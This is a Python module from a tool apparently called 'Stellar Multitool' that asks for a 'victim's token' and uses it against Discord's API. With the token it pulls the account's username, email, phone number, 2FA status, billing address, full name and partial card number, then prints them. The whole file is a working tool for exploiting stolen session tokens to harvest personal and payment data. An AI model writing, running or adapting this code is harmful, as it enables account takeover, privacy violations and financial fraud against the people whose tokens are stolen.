# Stellar Multitool is proudly coded by @swedewtf, @rinfys and @crxelty (no longer active)
# Multitool maintained/updated by @swedewtf and @rinfys

from util.plugins.pluh import *
import requests
import os

from colorama import *

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
white = Fore.WHITE

def grabinfo():
    token = str(input(f"{blue}[{white}S{blue}]{white} Enter victim's token: "))
    tokencheck(token)
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    basicinfo = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
    username = basicinfo["username"] + "#" + str(basicinfo["discriminator"])
    userid = basicinfo["id"]
    avatar = basicinfo["avatar"]
    banner = basicinfo["banner"]
    doubleauth = basicinfo["mfa_enabled"]
    language = basicinfo["locale"]
    email = basicinfo["email"]
    emailverified = basicinfo["verified"]
    phone = basicinfo["phone"]
    os.system("cls")
    print(f"""
            Basic user info:
          
    [{blue}username:        {white}{username}]
    [{blue}user id:         {white}{userid}]
    [{blue}token:           {white}{token}]
    [{blue}avatar:          {white}{avatar}]
    [{blue}banner:          {white}{banner}]
    [{blue}2FA:             {white}{doubleauth}]
    [{blue}language:        {white}{language}]
    [{blue}email:           {white}{email}]
    [{blue}Verified email:  {white}{emailverified}]
    [{blue}Phone number:    {white}{phone}]
    """)

    # -------------------------------

    billinginfo = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers).json()
    hasnitro = bool(len(billinginfo) > 0)
    ccnumbers = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
    }
    for paymentinfo in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=headers).json():
        billing = paymentinfo['billing_address']
        name = billing['name']
        address1 = billing['line_1']
        address2 = billing['line_2']
        city = billing['city']
        postal = billing['postal_code']
        state = billing['state']
        country = billing['country']
        if paymentinfo['type'] == 1:
            ccbrand = paymentinfo['brand']
            ccfirst = ccnumbers.get(ccbrand)
            cclast = paymentinfo['last_4']
        else:
            print("Couldn't get billing info")
        ccnumber = f"{ccfirst}*** **** **** {cclast}"
    if hasnitro == True:
        print(f"""
            Billing info:

    [{blue}Address 1:       {white}{address1}]
    [{blue}Address 2:       {white}{address2}]
    [{blue}city:            {white}{city}]
    [{blue}state:           {white}{state}]
    [{blue}postal code:     {white}{postal}]   
    [{blue}country:         {white}{country}]
    [{blue}Full name:       {white}{name}]
    [{blue}CC Number:       {white}{ccnumber}] 
        """)
    else:
        print("Couldn't get billing info...\n")
    input("Press anything to continue...")
    __import__("Stellar").main()
